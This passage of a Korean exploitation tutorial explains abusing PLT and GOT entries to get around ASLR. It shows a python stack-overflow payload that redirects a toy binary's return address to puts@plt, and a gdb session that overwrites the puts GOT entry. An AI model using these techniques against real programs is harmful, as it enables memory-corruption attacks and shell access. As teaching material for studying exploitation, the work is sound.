Abusing PLT, GOT :
    특정 함수의 PLT를 호출하면 함수의 실제 주소를 호출하는 것과 같은 효과를 나타냅니다. 
    PLT의 주소는 고정되어 있기 때문에 서버에 ASLR 보호 기법이 적용되어 있어도 PLT로 점프하면 RTL과 비슷한 공격이 가능합니다.
    
    example4 예시에서 스택 버퍼 오버플로우 취약점을 이용해 리턴 주소를 puts@plt+6(0x8048326)으로 바꾸고, 
    첫 번째 인자는 "ASLR!" 문자열의 주소인 0x8048553로 바꿔 보겠습니다.

    ex)
        $ (python -c 'print "A"*36 + "\x26\x83\x04\x08" + "BBBB" + "\x53\x85\x04\x08"') | ./example4
        Hello World!
        Hello ASLR!
        ASLR!
        [1]     121124 done                              ( python -c 'print "A"*36 + "\x26\x83\x04\x08" + "BBBB" + "\x53\x85\x04\x08"') | 
                121126 segmentation fault (core dumped)  ./example4

    puts 함수가 실행되어 "ASLR!" 문자열이 출력된 것을 볼 수 있습니다.
    하지만 puts 함수가 실행된 후 리턴할 주소는 0x42424242이기 때문에 Segmentation fault가 발생하여 프로그램이 비정상 종료됩니다.

    함수가 호출될 때 GOT에 저장된 주소로 점프하기 때문에 GOT에 저장된 값을 바꾸면 원하는 주소로 점프할 수 있습니다.

    example4 바이너리의 main 함수에 브레이크포인트를 걸고 실행한 후 puts 함수의 GOT인 0x804a00c 메모리의 값을 0xdeadbeef로 바꾸어 보겠습니다.
    ex)
        $ gdb -q ./example4
        Reading symbols from ./example4...(no debugging symbols found)...done.
        (gdb) b main
        Breakpoint 1 at 0x8048461
        (gdb) r
        Starting program: ~/example4 
        Breakpoint 1, 0x08048461 in main ()
        (gdb) set *0x804a00c = 0xdeadbeef
        (gdb) c
        Continuing.
        
        Program received signal SIGSEGV, Segmentation fault.
        0xdeadbeef in ?? ()
        (gdb) x/i $eip
        => 0xdeadbeef:	Cannot access memory at address 0xdeadbeef
        (gdb) 

    프로그램을 이어서 실행하면 puts가 호출될 때 puts@got에 저장된 값으로 점프해 eip 레지스터의 값이 0xdeadbeef로 바뀌게 됩니다.

    이제 PLT에 존재하는 함수들, 즉 프로그램에서 한 번 이상 사용하는 라이브러리 함수들은 고정된 주소를 통해 호출할 수 있다는 것을 알게 되었습니다. 
    하지만 익스플로잇 대상 바이너리인 example4에서는 최종 목표인 셸을 획득하는 데 필요한 함수들(system 함수나 exec 계열 함수)을
    사용하지 않기 때문에 ASLR 환경에서 직접적으로 해당 함수들을 호출할 수 없습니다.













































